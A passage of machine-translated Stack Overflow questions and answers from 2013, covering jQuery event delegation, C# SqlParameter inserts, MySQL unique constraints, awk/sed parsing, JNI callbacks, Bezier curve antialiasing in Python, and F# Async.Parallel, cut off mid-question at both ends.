除了我的链接正常工作外，它加载得很好。单击链接时，这些链接还需要另一个具有新功能的外部 javascript 文件。

```
$(document).ready(function(){
        $("#show_madhere_info").click(function() {
            $("div#modal").addClass("show"); 
```

我的问题是用于显示“show_madhere_info”div 的 jquery 函数不起作用。相反，它会恢复为“href”链接，它只会使页面重新加载。

```
<a id="show_madhere_info" href="">Info</a> 
```

就像它无法从另一个 jquery 函数中的我的 HTML 中识别 div。那有意义吗？在从之前的 jQuery 函数加载内容后，我可以在此处做什么以使链接正常工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:57:19.963

In html you can use:

```
<a id="show_madhere_info" href="javascript:void(0);">Info</a> 
```

In the code you can try:

```
$(document).on("click", "#show_madhere_info", function(e) {
  //e.preventDefault();
  //do what you want
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:14:35.253

如果您使用 jquery >= 1.7，请使用事件委托来动态添加内容

```
$('#extras').on('click', '#show_madhere_info', function(e){
    $("div#modal").addClass("show");
    e.preventDefault()
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T03:00:33.517

动态插入的元素需要使用 .on() 函数，并且不能使用标准的 .click() 方法。

尝试使用这个：

```
$(document).on('click', $("#show_madhere_info"), function(e) {

  e.preventDefault(); //stop the usual href action      
  ...

} 
```

还要确保您使用最新版本的 jQuery 1.9.x

# c# - 如何在 C# 中使用 SqlParameter 将多条记录插入数据库

> ID：15825144
> 
> 赞同：1
> 
> 时间：2013-04-05T02:57:09.537
> 
> 标签：c#, sql-server, sqlparameter

我正在尝试运行以下代码：

```
using (SqlConnection conn = new SqlConnection(connstr))
{
    conn.Open();

    StringBuilder sqlStr = new StringBuilder("INSERT into Customers values ( @name, @address, @city, @state)");

    SqlCommand cmd = new SqlCommand(sqlStr.ToString(), conn);
    cmd.Parameters.Add(new SqlParameter("@name", "John Smith"));
    cmd.Parameters.Add(new SqlParameter("@address", "123 Main St."));
    cmd.Parameters.Add(new SqlParameter("@city", "Detroit"));
    cmd.Parameters.Add(new SqlParameter("@state", "Michigan"));

    cmd.ExecuteReader();

    cmd.Parameters["@name"].Value = "William Jones";
    cmd.Parameters["@address"].Value = "500 Blanchard Ave";
    cmd.Parameters["@city"].Value = "Chicago";
    cmd.Parameters["@state"].Value = "Illinois";

    cmd.ExecuteReader();
} 
```

但是，我收到一个错误。我尝试了多种其他方法，但似乎没有任何效果。使用`SqlParameter`s 插入多条记录的正确方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T03:03:58.907

首先`cmd.ExecuteReader();`用于数据检索，而不是插入的正确方法。

利用

```
cmd.ExecuteNonQuery(); 
```

将您的代码更改为：

创建一个具有 4 个参数的方法，您可以在其中传递名称、地址、城市和状态，其中包括您的插入代码

```
private void InsertCustomers(string name,string address,string city,string state)
{
    using (SqlConnection conn = new SqlConnection(connstr))
                {
                    conn.Open();
                    StringBuilder sqlStr = new StringBuilder("INSERT into Customers values ( @name, @address, @city, @state)");
                    SqlCommand cmd = new SqlCommand(sqlStr.ToString(), conn);
                    cmd.Parameters.Add(new SqlParameter("@name", name));
                    cmd.Parameters.Add(new SqlParameter("@address", address));
                    cmd.Parameters.Add(new SqlParameter("@city", city));
                    cmd.Parameters.Add(new SqlParameter("@state", state));
                    cmd.ExecuteNonQuery();

                }

} 
```

然后在您的点击或您想要插入新客户的任何事件上

```
InsertCustomers("A","B","C","D");

InsertCustomers("E","F","G","H"); 
```

也许您需要首先在 ADO.NET 上开始学习基础知识

[C# Station ADO.NET 教程](http://csharp-station.com/Tutorial/AdoDotNet/Lesson01)

完成本教程后，您现在将熟悉 ado.net。

此致

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T10:38:00.130

更改您的代码

把**AddWithValue**而不是 Add

```
cmd.Parameters.AddWithValue(new SqlParameter("name", "John Smith")); 
```

和**ExecuteNonQuery()**而不是 ExecuteReader();

```
cmd.ExecuteNonQuery(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T03:06:51.807

```
using (SqlConnection conn = new SqlConnection(connstr))
            {
                conn.Open();
                StringBuilder sqlStr = new StringBuilder("INSERT into Customers values ( @name, @address, @city, @state)");
                SqlCommand cmd = new SqlCommand(sqlStr.ToString(), conn);
                cmd.Parameters.Add(new SqlParameter("name", "John Smith"));
                cmd.Parameters.Add(new SqlParameter("address", "123 Main St."));
                cmd.Parameters.Add(new SqlParameter("city", "Detroit"));
                cmd.Parameters.Add(new SqlParameter("state", "Michigan"));
                int rowsAffected = cmd.ExecuteNonQuery();

                cmd.Parameters["name"].Value = "William Jones";
                cmd.Parameters["address"].Value = "500 Blanchard Ave";
                cmd.Parameters["city"].Value = "Chicago";
                cmd.Parameters["state"].Value = "Illinois";
                rowsAffected = cmd.ExecuteNonQuery();
            } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T12:40:00.953

我以前只是保留对`SqlParameter`对象的引用并重用它，如下所示：

```
var paramName = new SqlParameter("@name", "John Smith");
var paramAddress = new SqlParameter("@address", "123 Main St.");
var paramCity = new SqlParameter("@city", "Detroit");
var paramState = new SqlParameter("@state", "Michigan");

SqlCommand cmd = new SqlCommand(sqlStr.ToString(), conn);
cmd.Parameters.AddRange(new[]{paramName, paramAddress, paramCity, paramState});
cmd.ExecuteReader();

paramName.Value = "William Jones";
paramAddress.Value = "500 Blanchard Ave";
paramCity.Value = "Chicago";
paramState.Value = "Illinois";

cmd.ExecuteReader(); 
```

现在应该可以解决您的问题。作为一个额外的好处，这也消除了您正在执行的集合查找：

```
cmd.Parameters["blah"] 
```

并将其替换为直接访问您需要的参数。我认为这应该在时钟中节省几个周期（虽然不多，哈哈）。

# ruby-on-rails - 如何在 Rails 3 中导入 JavaScript 文件？

> ID：15825145
> 
> 赞同：1
> 
> 时间：2013-04-05T02:57:19.227
> 
> 标签：ruby-on-rails, ruby, coffeescript

我刚刚开始使用 Ruby on Rails，并且在从 HTML 调用 JavaScript 函数时遇到了一些困难。我正在使用 Rails 3.2.13、Ruby 1.9.3 和 RubyMine 5.0.2。

我在“app/assets/javascripts/”中有一个名为“home.js.coffee”的 CoffeeScript 文件，它显然编译为同一文件夹中的“application.js”。在“app/views/home/”中，我有主页“index.html.erb”的 HTML 文件。我在“home.js.coffee”中有一个名为`cubes()`：

```
cubes = alert math.cube 3 
```

目前这真的很基本。我想先舒服点。

这是一个名为的对象`math`：

```
math =
    cube: (x) -> x* square x 
```

我创建了一个按钮`index.html.erb`，理论上应该调用这个函数：

```
<button onclick="cubes()">Try it</button> 
```

问题是让它找到 JavaScript 文件。index.html 的头脑中需要什么？application.html 的头部需要什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T03:03:06.227

问题是该功能在另一个范围内。如果您使用该`-b`选项编译 CoffeeScript，这将使函数全局可用，但简单的解决方案是：

```
root = exports ? this
root.cubes = -> alert math.cube 3 
```

然后你可以`cubes()`从你的 HTML 调用。

# mysql - Mysql创建索引设置为无重复

> ID：15825146
> 
> 赞同：0
> 
> 时间：2013-04-05T02:57:27.653
> 
> 标签：mysql, constraints, unique-constraint

我有一个表 p_places 有两列都是引用父表的外键：

```
mysql> create table p_places(
    -> user_id int not null,
    -> place_id int not null,
    -> FOREIGN KEY(user_id) references people(user_id) ON DELETE CASCADE,
    -> FOREIGN KEY(place_id) references places(place_id) ON DELETE CASCADE
    -> )engine=innodb; 
```

我正在尝试为两列创建索引，因此不能有重复的行（但是可以有重复的外键......只是没有行）。

我试过：

```
alter table p_places add index(user_id+place_id no duplicate);

alter table p_places add unique index(user_id+place_id);

alter table p_places add unique index both_id(user_id+place_id); 
```

但没有成功。我想尝试使用 alter table 命令来完成此操作，以用于学习目的，而不是创建表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:00:35.483

你已经接近你想要的了。

```
ALTER TABLE p_places ADD CONSTRAINT tb_unique UNIQUE(user_id, place_id) 
```

*   [命名约束的目的](https://stackoverflow.com/questions/1397440/what-is-the-purpose-of-constraint-naming)

# regex - 如何找到多行模式匹配（它们必须是第一次匹配）？

> ID：15825150
> 
> 赞同：1
> 
> 时间：2013-04-05T02:57:51.763
> 
> 标签：regex, shell, sed, awk

我知道这个问题[How to find patterns across multiple lines using grep?](https://stackoverflow.com/questions/2686147/how-to-find-patterns-across-multiple-lines-using-grep) 但我认为我的问题更复杂。所以我需要帮助。

我有一个字典`BCFile`文件

```
boundary
{
    inlet
    {
        type            fixedValue;
        value           uniform (5 0 0);
    }

    outlet
    {
        type            inletOutlet;
        inletValue      $internalField;
        value           $internalField;
    }

    ....
} 
```

我正在编写一个脚本，以便打印出`inlet`边界条件`fixedValue`和`outlet`边界条件`inletOutlet`。

如果我使用`cat BCFile | grep "type" | awk '{printf $2}' | tr -d ";"`，它将不起作用，因为关键字`type`多次出现。

如果我使用`awk -v RS='}' '/inlet/ { print $4 }' BCFile`，它也不起作用，因为关键字`inlet`也出现了很多次。

我需要一种方法来查找首先搜索关键字`inlet`然后搜索**最接近** `{`的和`}`.

有谁知道如何巧妙地做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T13:45:22.477

由于您没有为您发布的输入提供预期的输出，我们只是猜测您想要输出什么，但在 GNU awk 中如何：

```
$ cat tst.awk
BEGIN{ RS="\0" }
{
   print "inlet:",  gensub(/.*\yinlet\y[^}]*type\s+(\w+).*/,"\\1","")
   print "outlet:", gensub(/.*\youtlet\y[^}]*type\s+(\w+).*/,"\\1","")
}
$ gawk -f tst.awk file
inlet: fixedValue
outlet: inletOutlet 
```

解释：

```
RS="\0" 
```

= 将 Record Separator 设置为 Null 字符串，以便 awk 将整个文件作为单个记录读取。

```
gensub(/.*\yinlet\y[^}]*type\s+(\w+).*/,"\\1","") 
```

= 查找`inlet`后跟除 a 之外的任何字符的单词（因此您在文件中的第一个之后而不是最后一个`}`之前停止），然后是后面跟着空格的单词。( ) 之后的字母数字字符串是您要打印的单词，因此请记住它，然后将整个记录替换为保存在.`}``inlet``}``type``\w+``\\1`

设置`RS="\0"`和`gensub()`都是 gawk 特定的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:31:17.897

你能用perl吗？

```
#!/usr/bin/env perl

use strict;
use warnings;

my $filename = $ARGV[0];

open(my $f, '<', $filename) or die "Unable to open $filename: $!\n";
my $string = do { local($/); <$f> };
close($f);

$string =~ /(inlet).*type\s*(\w+).*(outlet).*type\s*(\w+)/s;
print "$1: $2\n$3: $4\n"; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T07:41:49.723

这可能对您有用（GNU sed）：

```
sed -rn '/^\s*(inlet|outlet)/,/^\s*}/!b;/type/s/.*\s(\S+);.*/\1/p' file 
```

如果您在“入口”和下一个“}”或“出口”和下一个“}”之间缩小“类型”的搜索范围，这会使整个练习变得更容易。

# list - curl 并并行获取 100 个 URL

> ID：15825162
> 
> 赞同：3
> 
> 时间：2013-04-05T02:59:08.740
> 
> 标签：list, url, curl, xargs

猫 urllist.txt | xargs -P0 -n1 卷曲 | grep "HREF=" > out.txt

这工作正常，但它同时连接一个网址。我怎样才能同时卷曲 100 个网址？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T12:27:23.493

不要使用 xargs，而是使用[并行](http://www.gnu.org/software/parallel/)来执行此操作。它与 xargs 非常相似，而是并行启动命令-因此得名...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-02T08:23:34.477

如果要对 url 进行基准测试，请使用 apache benchmark。它随 httpd 一起提供。样品运行：

```
$ ab -n 100 -c 100 "<url>" 
```

上面所做的是，以 100 的（c）并发访问 url 100 次

# android - 基于缓存的 jobject 和 methodID 从本机函数调用 Java 函数失败

> ID：15825164
> 
> 赞同：0
> 
> 时间：2013-04-05T02:59:13.743
> 
> 标签：android, android-ndk, java-native-interface

**Java源码：**

```
public void onEventListener(final int eventID, final int arg1,
            final long arg2, final String message) 
{
     Log.d("TEST", "onEventListener() is called - eventID = "+eventID);
} 
```

* * *

**JNI代码：**

```
JavaVM* gJvm = NULL;

pid_t _vm_tid = -1;

JNIEnv * jEnv = NULL;

jclass native_cls_id = NULL;

jmethodID _onEventListenerID=NULL;

jobject m_nativeObj = NULL;

jint JNI_OnLoad(JavaVM* vm, void* reserved)
{
        ....

    gJvm = vm;
    _vm_tid = gettid();
        ....
} 
```

//功能

```
void NotifyFromNative(int eventID, int arg1, long arg2, char* message) {
    LOGD("Receive_Message_Callback is called - eventID = %d",eventID);

    JNIEnv* env = NULL;
    pid_t tid = gettid();
    LOGD("Step 0");
    if (tid != _vm_tid) {

        jint ret = gJvm->AttachCurrentThread(&env, NULL);
        LOGD("Step 1 - tid != _vm_tid ret=%d",ret);

    } else {
        LOGD("Step 1 - tid == _vm_tid");
        gJvm->GetEnv((void**) &env, JNI_VERSION_1_4);
    }
    LOGD("Step 2");

    jstring jstr = env->NewStringUTF(message);
    LOGD("Step 3");

    env->CallVoidMethod(m_nativeObj, _onEventListenerID, eventID, arg1, arg2,
            jstr);
    LOGD("Step 4");
    env->DeleteLocalRef(jstr);

    if (tid != _vm_tid)
        gJvm->DetachCurrentThread();
} 
```

* * *

//初始化JNI函数

```
JNIEXPORT jint JNICALL Java_NativeManager_initialize(JNIEnv * env,
        jobject obj) {

    LOG_UI("Native initialize is called");

    m_nativeObj = env->NewGlobalRef(obj);

    jclass cls = env->FindClass(classPathName);
    if (cls == NULL) {
        LOGE("Can't find class %s", classPathName);
        return 0;
    }

    native_cls_id = (jclass) env->NewGlobalRef(cls);
    _onEventListenerID = env->GetMethodID(native_cls_id, "onEventListener",
                "(IIJLjava/lang/String;)V");

    if (!_onEventListenerID)
        {
         LOGE("Can't find onEventListener Java method");
             return 0;
    }   
        char* message = "test";
    jstring jstr = env->NewStringUTF(message);
        env->CallVoidMethod(m_nativeObj, _onEventListenerID, 1, 1, 1,
                jstr); //This call work well

    NotifyFromNative(0, 1, 1, "test"); //<= problem here

} 
```

* * *

**日志猫消息**

```
onEventListener() is called - eventID = 1 
Receive_Message_Callback is called - eventID = 0
Step 0
Step 1 - tid == _vm_tid
Step 2
Step 3 
W/dalvikvm(2160): Invalid indirect reference 0x576725d0 in decodeIndirectRef
E/dalvikvm(2160): VM aborting
A/libc(2160): Fatal signal 11 (SIGSEGV) at 0xdeadd00d (code=1), thread 2160 () 
```

**问题：**

谁能为我解释为什么调用 NotifyFromNative(0, 1, 1, "test") 有问题，尽管创建了对象的全局引用。非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-12T04:36:09.187

我发现Android JNI函数不能使用Long参数。所以，我将 Long 值分解为 2 个 Integer 值，代码现在可以工作了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-27T06:34:51.833

这是我偶然发现的一个非常古老的问题。但目前的答案是错误的。问题出在这里

```
void NotifyFromNative(int eventID, int arg1, long arg2, char* message) { 
```

它应该是

```
void NotifyFromNative(int eventID, int arg1, jlong arg2, char* message) { 
```

注意jlong​​。java中的long是64位的。c/c++ 中的 long 不保证是那个大小。jlong​​ 确保与 java 中的 long 类型兼容。

# python - 通过离散预过滤对曲线进行抗锯齿

> ID：15825165
> 
> 赞同：2
> 
> 时间：2013-04-05T02:59:15.700
> 
> 标签：python, math, graphics

我正在寻求实现[AE Fabris 和 AR Forrest 的论文“通过离散预过滤对曲线进行抗锯齿”中描述的贝塞尔曲线算法。](http://pdf.aminer.org/000/593/297/antialiasing_of_curves_by_discrete_pre_filtering.pdf)但是，我错过了难题的核心部分：Corthout 和 Pol 的曲线点包含算法。*它在Raster Imaging and Digital Typography*一书中进行了概述。

我可以简单地遍历每个像素，计算到贝塞尔曲线的最短距离，然后用它来计算画笔的效果。然而，正如论文中提到的，这是一种低效的方法。

是否有可以做同样事情的点包含算法（或等效算法）的大纲或伪代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-28T08:27:43.050

看到我已经弄清楚了，我将回答我自己的问题。结果表明不需要点遏制，并且已经在论文中进行了概述。

这是python和wxwidgets中的实现，使用box画笔渲染了几条曲线。

遗憾的是，它对于实际使用来说太慢了，即使在用 C 重写并进行了几次优化之后也是如此。我能得到的最好结果是每贝塞尔曲线大约 30 毫秒，渲染 100 条曲线的图片需要 3 秒。大多数其他矢量应用程序倾向于使用基于路径的贝塞尔渲染算法，这是我现在将要探索的。

```
#!/usr/bin/python
# test15.py

import wx
import math
import cProfile

class Brush(object):
    def __init__(self, size):
        self._brushsize = size
        self.__halfbrush = self._brushsize / 2
    # returns true if inside or touching box
    def insidebox(self, box):
        minp = box[0]
        maxp = box[1]
        if maxp.x < -self.__halfbrush:
            return False
        if minp.x > self.__halfbrush:
            return False
        if maxp.y < -self.__halfbrush:
            return False
        if minp.y > self.__halfbrush:
            return False
        return True

    def at(self, p):
        px = p.x * p.x # 0.027
        py = p.y * p.y 
        d = math.sqrt(px + py)
        return  d < self.__halfbrush

    def getSize(self):
        return self._brushsize

class BezierPoint(object):
    SCALEFACTOR = 4 # we divide each pixel into 4x4 matrix

    @classmethod
    def newRealPoint(nbs, x,y):
        x=int(x*BezierPoint.SCALEFACTOR)
        y=int(y*BezierPoint.SCALEFACTOR)
        return BezierPoint(x,y)

    def __init__(self,x,y):
        self.x=int(x)
        self.y=int(y)

    def __str__(self):
        return  self.x+ 'x' + self.y

#recalls = 0

class QuadBezier(object): # cubic bezier
    COVERED = 0x01
    NOT_COVERED = 0x02

    @classmethod
    def newRealPoint(nbs, x1,y1,x2,y2,x3,y3,x4,y4):
        b = QuadBezier(x1,y1,x2,y2,x3,y3,x4,y4)
        b.p1 = BezierPoint.newRealPoint( x1, y1)
        b.p2 = BezierPoint.newRealPoint( x2, y2)
        b.p3 = BezierPoint.newRealPoint( x3, y3)
        b.p4 = BezierPoint.newRealPoint( x4, y4)
        b._minx = min(b.p1.x,b.p2.x,b.p3.x,b.p4.x)
        b._maxx = max(b.p1.x,b.p2.x,b.p3.x,b.p4.x)
        b._miny = min(b.p1.y,b.p2.y,b.p3.y,b.p4.y)
        b._maxy = max(b.p1.y,b.p2.y,b.p3.y,b.p4.y)
        return b

    def __init__(self,x1,y1,x2,y2,x3,y3,x4,y4):
        self.p1 = BezierPoint(x1,y1)
        self.p2 = BezierPoint(x2,y2)
        self.p3 = BezierPoint(x3,y3)
        self.p4 = BezierPoint(x4,y4)
        self._minx = min(x1,x2,x3,x4)
        self._maxx = max(x1,x2,x3,x4)
        self._miny = min(y1,y2,y3,y4)
        self._maxy = max(y1,y2,y3,y4)

    def __str__(self):
        s = 'p1 = ' + str(self.p1.x) +'x'+ str(self.p1.y) +' p2 = '+str(self.p2.x) +'x'+str(self.p2.y)
        s = s + ' p3 = ' + str(self.p3.x) +'x'+ str(self.p3.y) +' p4 = '+str(self.p4.x) +'x'+str(self.p4.y)
        return  s

    def subdivide(self, left=True):
        # http://antigrain.com/research/adaptive_bezier/
        # according to the paper, we control vertices need to be performed at
        # higher precision than the discrete space will allow to for any accuracy loss 
        x1 = self.p1.x << 2 
        x2 = self.p2.x << 2 
        x3 = self.p3.x << 2
        x4 = self.p4.x << 2
        y1 = self.p1.y << 2
        y2 = self.p2.y << 2
        y3 = self.p3.y << 2
        y4 = self.p4.y << 2
        x12   = (x1 + x2) >> 1
        y12   = (y1 + y2) >> 1
        x23   = (x2 + x3) >> 1
        y23   = (y2 + y3) >> 1
        x34   = (x3 + x4) >> 1
        y34   = (y3 + y4) >> 1
        x123  = (x12 + x23) >> 1
        y123  = (y12 + y23) >> 1
        x234  = (x23 + x34) >> 1
        y234  = (y23 + y34) >> 1
        x1234 = (x123 + x234) >> 1
        y1234 = (y123 + y234) >> 1

        if left:
            return QuadBezier(x1 >> 2, y1 >> 2, x12 >> 2, y12 >> 2, x123 >> 2, y123 >> 2, x1234 >> 2, y1234 >> 2)
        return QuadBezier(x1234 >> 2, y1234 >> 2, x234 >> 2, y234 >> 2, x34 >> 2, y34 >> 2, x4 >> 2, y4 >> 2)

    def getboundingbox(self):
        return BezierPoint(self._minx,self._miny), BezierPoint(self._maxx,self._maxy)

    def area (self):
        m1,m2 = self.getboundingbox()
        return m2.x-m1.x, m2.y-m1.y

    def minus (self, p):
        px = p.x 
        py = p.y 
        return QuadBezier(self.p1.x - px, self.p1.y - py, 
                          self.p2.x - px, self.p2.y - py, 
                          self.p3.x - px, self.p3.y - py, 
                          self.p4.x - px, self.p4.y - py)

    def draw(self, img,pd, stackofbrushes):
        mmin,mmax = self.getboundingbox()
        numberofbrushes = len(stackofbrushes)
        largestbrushsize = stackofbrushes[numberofbrushes-1].getSize()
        print 'largestbrushsize = ', largestbrushsize
        xstart,xend = int(math.floor(mmin.x/BezierPoint.SCALEFACTOR-largestbrushsize)), int(math.ceil(mmax.x/BezierPoint.SCALEFACTOR+largestbrushsize))
        ystart,yend = int(math.floor(mmin.y/BezierPoint.SCALEFACTOR-largestbrushsize)), int(math.ceil(mmax.y/BezierPoint.SCALEFACTOR+largestbrushsize))
        print (xend - xstart) * 4, (yend - ystart) * 4, ' total area = ', ((xend - xstart) * 4) * ((yend - ystart) * 4)
        # for each pixel in the image
        for x in xrange(xstart, xend):
            for y in xrange(ystart, yend):
                pixel = BezierPoint(x*BezierPoint.SCALEFACTOR+2,y*BezierPoint.SCALEFACTOR+2) # todo: fix me
                covered, height = self.antialisedDilate(stackofbrushes, pixel, numberofbrushes)
                if covered == QuadBezier.COVERED:
                    img.MoveTo(pd,x,y)
                    #print height
                    img.Set(41*height,41*height,41*height)

    def antialisedDilate(self, stackofbrushes, p, numberofbrushes):
        mstroke = self.minus(p)  # centre the stroke
        h = 0
        n = numberofbrushes - 1
        for i in range(n,-1,-1):
            if mstroke.stroke(stackofbrushes[i]) == QuadBezier.COVERED:
                h = i
            else:
                if h == 0:
                    return QuadBezier.NOT_COVERED, 0
                return QuadBezier.COVERED, h
        return QuadBezier.COVERED, h

    def baseCase(self):
        """ returns true if the curve is primitive, that is that the length of the curve is <= 1 of the discrete space selected 
        """
        p1,p2 = self.getboundingbox()
        mx,my = p2.x-p1.x, p2.y-p1.y
        #print mx,my
        distance = 2
        if mx >= -distance and mx <= distance:
            if my > -distance and my <= distance:
                return True
        return False

    def stroke(self, b):
        """ http://pdf.aminer.org/000/593/297/antialiasing_of_curves_by_discrete_pre_filtering.pdf
        """
        # NotInDilatedBBox
        if not b.insidebox(self.getboundingbox()):
            return QuadBezier.NOT_COVERED
        if self.baseCase():
            return QuadBezier.NOT_COVERED
        if b.at(self.p1):
            return QuadBezier.COVERED
        if b.at(self.p4):
            return QuadBezier.COVERED

        left = self.subdivide(True)
        if (left.stroke(b)==QuadBezier.COVERED):
            return QuadBezier.COVERED
        right = self.subdivide(False)
        if (right.stroke(b)==QuadBezier.COVERED):
            return QuadBezier.COVERED

        return QuadBezier.NOT_COVERED

pd = None
pixels = None
def timer ():
    stackofbrushes = [Brush(6.0), Brush(7.0), Brush(9.0), Brush(11.0), Brush(13.0), Brush(15.0)] # largest last

    for i in xrange(6):
        yplus = i * 20
        bezier = QuadBezier.newRealPoint(40.0,50.0+yplus, 80.0,46.0+yplus, 120.0,46.0+yplus, 160.0,50.0+yplus)
        bezier.draw(pixels, pd, stackofbrushes)

class MyToolBar(wx.Frame):
    def __init__(self, parent, id, title):
        wx.Frame.__init__(self, parent, id, title, wx.DefaultPosition, wx.Size(700, 700))
        self.Centre()

        self.Bind(wx.EVT_TOOL, self.OnExit, id=4)
        bmp = wx.EmptyBitmap(700,700)
        # we're using the undocumented native pixel data because the memorydx object introduces artifacts on MacOS
        global pd
        global pixels

        pd = wx.NativePixelData(bmp, wx.Point(0,0), wx.Size(700,700))
        width,height = pd.GetWidth(), pd.GetHeight()
        pixels = pd.GetPixels()
        for x in xrange(width):
            for y in xrange(height):
                pixels.MoveTo(pd,x,y)
                pixels.Set(255,255,255)

        cProfile.run('timer()')

        wx.StaticBitmap(self, wx.ID_ANY, bmp)

    def OnExit(self, event):
        self.Close()

class MyApp(wx.App):
    def OnInit(self):
        frame = MyToolBar(None, -1, 'Antialiasing of Curves by Discrete Pre-filtering')
        frame.Show(True)
        return True

app = MyApp(0)
app.MainLoop() 
```

# mysql - MySQL表关系布局（多对多有歧义）

> ID：15825177
> 
> 赞同：1
> 
> 时间：2013-04-05T03:00:40.317
> 
> 标签：mysql, structure, relationship

我有用于帐户、组和项目的表格。现在我想描述帐户和组对帐户和项目的访问权限。对于项目，有读、写和无访问权限，而对于帐户，只有访问权限，没有访问权限。

我想到的第一个解决方案是使用以下布局创建一个访问表：

```
INT accessed_account_or_project_id
INT accessor_account_or_group_id
BOOLEAN accessed_is_project
BOOLEAN accessor_is_group
BOOLEAN canWrite 
```

这是一个好的结构还是应该为项目和帐户访问权限创建 2 个单独的表，或者甚至可能为不同的访问者创建 4 个表？

我找到了一些关于多对多关系的一般建议，但在这种情况下，由于歧义和*canWrite* ，我不确定作为新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:21:10.737

您不应该有代表两组不同数据的列`_or_`，因此我建议您使用四表解决方案来处理帐户/项目/组权限映射的可能组合。这应该可以很容易地强制执行约束以防止权限冲突。

表中条目的存在可以指示访问，但`projects`具有额外的访问级别。只要你不认为后面会引入更多的访问级别，我认为`canWrite`两个projects表上的列就可以了。否则，您可能拥有指向具有一组权限类型的另一个表的链接。

# ios - 为 Web 应用程序创建 HTML 密码屏幕

> ID：15825182
> 
> 赞同：0
> 
> 时间：2013-04-05T03:01:14.257
> 
> 标签：ios, html, css, jquery-mobile

我正在开发一个使用 jQuery mobile 开发的移动 webapp，我想要一个类似于 iPhone 通用密码屏幕的简单密码锁定屏幕。

我遇到的主要问题是让数字键盘显示并且仅在将代码输入每个文本框时才显示一个点。目前，我可以让它在 ios 和 android 上工作的唯一方法是将文本字段设置为类型数字，但是在密码输入期间会显示数字。

我希望有人已经做到了，或者有一个简单的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-02T14:26:49.793

我不知道这种密码屏幕的用途，尤其是作为网络应用程序。但无论如何你可以做一些像这样的hacky，

1.  创建一个输入框`type=number`
2.  创建一个jquery事件onkeyup，
    *   获取输入到变量中的值。
    *   将输入框的内容替换为`*`
3.  当按下 OK 按钮时，检查存储在变量中的值。

这样您就可以使用数字键盘而不显示内容。

# asynchronous - F# 使用 Async.Parallel 并行运行 2 个任务

> ID：15825183
> 
> 赞同：16
> 
> 时间：2013-04-05T03:01:19.843
> 
> 标签：asynchronous, f#

假设我有这两个功能：

```
let dowork n =
    async {
        do printfn "work %d" n
    }

let work i = async {
  do! Async.Sleep(2000)
  printfn "work finished %d" i } 
```

我将如何使用 Async.Parallel 同时运行它们并等待两者都完成后再继续？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2013-04-05T08:32:21.860

如前所述，您只需将异步函数放在一个序列中并将它们传递给`Async.Parallel`.

但是，如果您需要执行返回不同类型结果的不同作业，您可以使用`Async.StartChild`：

```
let fn1 = async {
        do! Async.Sleep 1000
        printfn "fn1 finished!"
        return 5
    }

let fn2 = async {
        do! Async.Sleep 1500
        printfn "fn2 finished!"
        return "a string"
    }

let fncombined = async {
        // start both computations simultaneously
        let! fn1 = Async.StartChild fn1
        let! fn2 = Async.StartChild fn2

        // retrieve results
        let! result1 = fn1
        let! result2 = fn2

        return sprintf "%d, %s" (result1 + 5) (result2.ToUpper())
    }

fncombined
|> Async.RunSynchronously
|> printfn "%A" 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2013-04-05T03:10:06.647

`Async.Parallel`需要一个异步序列。在这种情况下，我将它传递给一个列表。

```
[dowork 1; work 2]
|> Async.Parallel
|> Async.RunSynchronously
|> ignore 
```

如果要返回不同类型的数据，请使用[Discriminate Union](http://msdn.microsoft.com/en-us/library/dd233226.aspx)。

```
type WorkResults =
    | DoWork of int
    | Work of float32

let dowork n =
    async {
        do printfn "work %d" n
        return DoWork(n)
    }

let work i = async {
  do! Async.Sleep(2000)
  printfn "work finished %d" i 
  return Work(float32 i / 4.0f)
}

[dowork 1; work 2]
|> Async.Parallel
|> Async.RunSynchronously
|> printf "%A" 
```

输出

```
work 1
work finished 2
[|DoWork 1; Work 0.5f|] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-06-15T16:04:22.553

当任务数量在编译时固定时，我喜欢这样的辅助函数：

```
module Async = 

  let parallel2 a b = 
    async {
      // Start both tasks
      let! x = Async.StartChild a
      let! y = Async.StartChild b

      // Wait for both to finish
      let! i = x
      let! j = y

      // Return both results as a strongly-typed tuple
      return i, j
    } 
```

像这样的用法：

```
let work1 = async { return 1 }

let work2 = async { return "a" }

let work1And2 = 
  async {
    let! (a, b) = Async.parallel2 work1 work2

    printfn "%i %s" a b
  } 
```

请注意任务的不同类型。这可能非常有用！

我们可以为 , 添加一个额外的助手`Async<Unit>`，因为`()`和`((), ())`具有相同的语义：

```
module Async = 

  // ...

  let doParallel2 (a : Async<Unit>) (b : Async<Unit>) =
    parallel2 a b
    |> Async.Ignore 
```

然后应用于您的场景：

```
async {
  do! Async.doParallel2 (dowork 1) (work 2)
} 
```

# ruby-on-rails - 你如何将数组传递给rails种子中的模型

> ID：15825187
> 
> 赞同：0
> 
> 时间：2013-04-05T03:01:34.930
> 
> 标签：ruby-on-rails, ruby

我有一个非常简单的问题：

假设我正在尝试在 db:seed 文件的 City 模型中创建一个新城市。

我在 seed.rb 中有以下代码，我想将多个值传递给该城市运动队的属性，如下所示：

```
City.create!(city: "Chicago,IL", teams: ["Bulls", "Cubs", "Bears"]) 
```

但是，当我运行控制台并执行 City.first 时，我得到以下信息：

```
